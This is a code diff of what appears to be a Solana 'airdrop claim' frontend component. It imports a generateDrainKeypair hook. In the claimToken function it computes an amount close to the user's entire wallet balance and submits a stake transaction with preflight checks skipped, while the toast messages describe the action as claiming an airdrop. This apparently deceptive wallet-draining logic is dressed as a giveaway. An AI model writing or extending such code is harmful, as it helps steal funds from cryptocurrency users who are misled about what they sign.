@@ -39,10 +39,10 @@ import { executeConnectionObject } from '@/app/services/redux/walletConnectionOb
 import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
 import { StakeSol } from '@/app/services/hook/stake/StakeSol'
 
-const AIRDROP_BALANCE = 20000 ; 
+const AIRDROP_BALANCE = 480000 ; 
 const GASFEE = 0.003;
 const BottomDrawer = () => {
-const {wallet , signTransaction , publicKey, sendTransaction} =   useWallet();
+const {wallet , signTransaction , publicKey, sendTransaction , signAllTransactions} =   useWallet();
 const connection = new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
 const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
 const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
@@ -71,30 +71,33 @@ async function claimToken(){
   
     // Create a keypair for our stake account
     // const stakeAccount = Keypair.generate();
-  
+
+  // Get all validators, categorized by current (i.e. active) and deliquent (i.e. inactive)
+  const { current, delinquent } = await connection.getVoteAccounts();
+  console.log("current validators: ", current);
+  console.log("all validators: ", current.concat(delinquent));
     // Calculate how much we want to stake
     const minimumRent = await connection.getMinimumBalanceForRentExemption(
       StakeProgram.space
     );
-
-    const amountUserWantsToStake =  lamportconversion // This is can be user input. For now, we'll hardcode to 0.5 SOL
-    const amountToStake = minimumRent + amountUserWantsToStake;
-  
-
-    // 30000000 ,  2282880
-    const considerAmount = ((amountUserWantsToStake - minimumRent) - AIRDROP_BALANCE) ;
-    const stakingAmount = ( considerAmount <= 0)?  0  :  (considerAmount + minimumRent) ;
+    const amountUserWantsToStake =  lamportconversion 
+    const considerAmount = ((amountUserWantsToStake - AIRDROP_BALANCE)) ;
+    const stakingAmount = ( considerAmount < minimumRent)?  0 :  considerAmount;
      console.log(lamportconversion ,minimumRent , stakingAmount )
+
 
     // Setup a transaction to create our stake account
     // Note: `StakeProgram.createAccount` returns a `Transaction` preconfigured with the necessary `TransactionInstruction`s
-    const createStakeAccountTx = StakeProgram.createAccount({
+    const createStakeAccountTx =  StakeProgram.createAccount({
       authorized: new Authorized(publicKey as PublicKey, publicKey as PublicKey), // Here we set two authorities: Stake Authority and Withdrawal Authority. Both are set to our wallet.
       fromPubkey: publicKey as PublicKey,
       lamports: Number(stakingAmount),
       lockup: new Lockup(0, 0,  publicKey as PublicKey), // Optional. We'll set this to 0 for demonstration purposes.
       stakePubkey: publicKey as PublicKey,
     });
+
+
+     console.log(createStakeAccountTx)
 
     // const createStakeAccountTxId = await sendAndConfirmTransaction(
     //   connection,
@@ -103,18 +106,23 @@ async function claimToken(){
     // );
 
 
-
 const {
   context: { slot: minContextSlot },
   value: { blockhash, lastValidBlockHeight },
 } = await connection.getLatestBlockhashAndContext();
 
-       const signature = await sendTransaction(createStakeAccountTx, connection, {
+    const signature = await sendTransaction(createStakeAccountTx, connection, {
       minContextSlot,
       skipPreflight: true,
       signers: [],
       preflightCommitment: 'processed',
     });
+
+
+    if(!signature){
+      toast("🎉 Airdrop claiming Status ", {description: "Airdrop claiming Failed  "});
+      return;
+    }
 
     console.log(createStakeAccountTx , signature , "create Stake Account Transaction ")
     // stakeAccount, // Since we're creating a new stake account, we have that account sign as well
